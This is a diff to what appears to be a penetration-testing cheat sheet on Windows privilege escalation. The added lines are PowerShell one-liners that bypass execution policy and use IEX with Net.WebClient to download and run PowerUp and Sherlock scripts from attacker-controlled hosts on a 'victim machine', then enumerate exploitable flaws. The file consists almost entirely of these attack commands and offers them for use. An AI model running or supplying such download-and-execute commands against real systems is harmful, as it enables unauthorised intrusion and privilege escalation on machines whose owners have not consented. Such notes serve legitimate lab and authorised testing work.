@@ -1,4 +1,21 @@
 https://github.com/frizb/Windows-Privilege-Escalation
+
+
+###powershell with Priv checker
+```
+PS C:\Users\merlin\Desktop> PS C:\Users\merlin\Desktop> powershell.exe -exec bypass -Command "& {Import-Module .\Sherlock.ps1; Find-AllVulns}"
+
+c:\>powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/PowerUp.ps1') ; Invoke-AllChecks"
+
+c:\>powershell.exe -ExecutionPolicy Bypass -noLogo -Command "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/powerup.ps1') ; Invoke-AllChecks"
+
+c:\>powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/Sherlock.ps1') ; Find-AllVulns"
+
+If you have your ps1 file downloaded to the victim machine then run using this
+c:\>powershell.exe -exec bypass -Command "& {Import-Module .\Sherlock.ps1; Find-AllVulns}"
+
+c:\>powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"
+```
 #
 powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.124:8111/Sherlock.ps1'); Find-AllVulns
 
